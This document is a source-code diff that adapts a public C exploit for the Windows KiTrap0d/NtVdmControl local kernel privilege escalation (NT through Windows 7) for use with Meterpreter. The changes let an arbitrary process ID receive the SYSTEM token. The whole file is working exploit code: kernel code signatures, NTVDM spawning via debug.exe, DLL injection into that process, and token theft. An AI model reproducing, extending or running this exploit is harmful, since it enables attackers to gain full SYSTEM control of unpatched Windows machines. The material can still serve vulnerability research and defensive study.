@@ -1,4 +1,4 @@
-// 
+//
 // --------------------------------------------------
 // Windows NT/2K/XP/2K3/VISTA/2K8/7 NtVdmControl()->KiTrap0d local ring0 exploit
 // -------------------------------------------- taviso@sdf.lonestar.org ---
@@ -37,6 +37,19 @@
 //      Julien, Lcamtuf, Spoonm, Neel, Skylined, Redpig, and others.
 //
 
+
+//
+// This code was slightly tweaked for use in a Meterpreter script, the changes
+// allow an unrelated PID to receive the SYSTEM token. Some minor cleanups were
+// made as well, mostly around resolving the system32 directory.
+//
+// Long-term, this will be reimplemented as an additional vector in the priv
+// extension.
+//
+// - hdm[at]metasploit.com 2010/01/19
+//
+
+
 #ifndef WIN32_NO_STATUS
 # define WIN32_NO_STATUS // I prefer the definitions from ntstatus.h
 #endif
@@ -47,6 +60,7 @@
 #include <winternl.h>
 #include <stddef.h>
 #include <stdarg.h>
+#include <tchar.h>
 #ifdef WIN32_NO_STATUS
 # undef WIN32_NO_STATUS
 #endif
@@ -70,12 +84,12 @@ typedef struct {
     USHORT  PathLength;
     CHAR    ImageName[256];
 } SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
- 
+
 typedef struct {
     ULONG   Count;
     SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
 } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
-    
+
 // These are generated using kd -kl -c 'db nt!Ki386BiosCallReturnAddress;q'
 static CONST UCHAR CodeSignatures[][16] = {
     { "\x64\xA1\x1C\x00\x00\x00\x5A\x89\x50\x04\x8B\x88\x24\x01\x00\x00" }, // Windows NT4
@@ -100,11 +114,17 @@ int main(int argc, char **argv)
 {
     HANDLE VdmHandle;
     HANDLE RemoteThread;
-    DWORD ShellPid;
+    DWORD ShellPid = 0;
+    DWORD KillPid = 0;
     DWORD ThreadCode;
     DWORD KernelBase;
+    TCHAR VDMPath[_MAX_PATH];
+    TCHAR CMDPath[_MAX_PATH];
     CHAR Buf[32];
     DWORD Offset;
+
+	if(argc > 1)
+        ShellPid = atoi(argv[1]);
 
     LogMessage(L_INFO,
         "\r"
@@ -114,13 +134,36 @@ int main(int argc, char **argv)
         "\n"
     );
 
-    // Spawn the process to be elevated to SYSTEM.
-    LogMessage(L_INFO, "Spawning a shell to give SYSTEM token (do not close it)");
+    GetSystemDirectory(VDMPath, 1024);
+    _tcscat_s(VDMPath, _MAX_PATH, _T("\\debug.exe"));
 
-    if (PrepareProcessForSystemToken("C:\\WINDOWS\\SYSTEM32\\CMD.EXE", &ShellPid) != TRUE) {
-        LogMessage(L_ERROR, "PrepareProcessForSystemToken() returned failure");
-        goto finished;
-    }
+	GetSystemDirectory(CMDPath, 1024);
+    _tcscat_s(CMDPath, _MAX_PATH, _T("\\cmd.exe"));
+
+    if(! ShellPid) {
+        // Spawn the process to be elevated to SYSTEM.
+        LogMessage(L_INFO, "Spawning a shell to give SYSTEM token (do not close it)");
+
+        if (PrepareProcessForSystemToken(CMDPath, &ShellPid) != TRUE) {
+            LogMessage(L_ERROR, "PrepareProcessForSystemToken() returned failure");
+		    goto finished;
+        }
+	} else {
+
+        // Spawn the process as a placeholder, no idea why this is needed yet (BSOD w/o).
+        LogMessage(L_INFO, "Spawning a shell to make the process happy (ignore this)");
+
+        if (PrepareProcessForSystemToken(CMDPath, &ShellPid) != TRUE) {
+            LogMessage(L_ERROR, "PrepareProcessForSystemToken() returned failure");
+		    goto finished;
+        }
+		KillPid = ShellPid;
+        ShellPid = atoi(argv[1]);
+	}
+
+    // Dance around a consistent BSOD if we don't wait
+    LogMessage(L_INFO, "Waiting two seconds while the child process initializes...");
+    Sleep(2000);
 
     // Scan kernel image for the required code sequence, and find the base address.
     if (ScanForCodeSignature(&KernelBase, &Offset) == FALSE) {
@@ -136,7 +179,7 @@ int main(int argc, char **argv)
     // Invoke the NTVDM subsystem, by launching any MS-DOS executable.
     LogMessage(L_INFO, "Starting the NTVDM subsystem by launching MS-DOS executable");
 
-    if (SpawnNTVDMAndGetUsefulAccess("C:\\WINDOWS\\SYSTEM32\\DEBUG.EXE", &VdmHandle) == FALSE) {
+    if (SpawnNTVDMAndGetUsefulAccess(VDMPath, &VdmHandle) == FALSE) {
         LogMessage(L_ERROR, "SpawnNTVDMAndGetUsefulAccess() returned failure");
         goto finished;
     }
@@ -189,10 +232,11 @@ int main(int argc, char **argv)
             // Verify the vdmexploit.dll file exists, is readable and is in a suitable location.
             LogMessage(L_ERROR, "The exploit thread was unable to load the injected dll");
             break;
-        case 'w00t': 
+        case 'w00t':
             // This means the exploit payload was executed at ring0 and succeeded.
             LogMessage(L_INFO, "The exploit thread reports exploitation was successful");
-            LogMessage(L_INFO, "w00t! You can now use the shell opened earlier");
+            if(! KillPid)
+                LogMessage(L_INFO, "w00t! You can now use the shell opened earlier");
             break;
         default:
             // Unknown error. Sorry, you're on your own.
@@ -204,17 +248,27 @@ int main(int argc, char **argv)
     CloseHandle(VdmHandle);
     CloseHandle(RemoteThread);
 
+	if(KillPid) {
+       LogMessage(L_INFO, "Killing the temporary process handle with pid %d", KillPid);
+       VdmHandle = OpenProcess( PROCESS_TERMINATE, FALSE, KillPid );
+	   if(VdmHandle && VdmHandle != INVALID_HANDLE_VALUE) {
+           TerminateProcess(VdmHandle, 0);
+	   }
+	}
+
 finished:
-    LogMessage(L_INFO, "Press any key to exit...");
-    getch();
     return 0;
 }
 
 // Start a process to give SYSTEM token to.
 static BOOL PrepareProcessForSystemToken(PCHAR App, PDWORD ProcessId)
 {
-    PROCESS_INFORMATION pi = {0};
-    STARTUPINFO si = { sizeof si };
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si;
+
+    ZeroMemory(&pi, sizeof(pi));
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
 
     if (CreateProcess(App, App, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == FALSE) {
         LogMessage(L_ERROR, "CreateProcess(\"%s\") returned failure, %#x", App, GetLastError());
@@ -267,7 +321,7 @@ static BOOL SpawnNTVDMAndGetUsefulAccess(PCHAR App, PHANDLE ProcessHandle)
     return TRUE;
 }
 
-// Use the DLL Injection technique to access the NTVDM process. 
+// Use the DLL Injection technique to access the NTVDM process.
 // http://en.wikipedia.org/wiki/DLL_injection
 static BOOL InjectDLLIntoProcess(PCHAR DllPath, HANDLE ProcessHandle, PHANDLE RemoteThread)
 {
@@ -340,7 +394,7 @@ BOOL ScanForCodeSignature(PDWORD KernelBase, PDWORD OffsetFromBase)
 
     // Determine kernel version so that the correct code signature is used
     GetVersionEx(&osvi);
-    
+
     LogMessage(L_DEBUG, "GetVersionEx() => %u.%u", osvi.dwMajorVersion, osvi.dwMinorVersion);
 
     if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
@@ -396,7 +450,7 @@ BOOL ScanForCodeSignature(PDWORD KernelBase, PDWORD OffsetFromBase)
     }
 
     LogMessage(L_ERROR, "Code not found, the signatures need to be updated for your kernel");
-    
+
     FreeLibrary(KernelHandle);
 
     return FALSE;
@@ -421,6 +475,7 @@ BOOL LogMessage(LEVEL Level, PCHAR Format, ...)
 
     fflush(stdout);
     fflush(stderr);
- 
+
     return TRUE;
 }
+
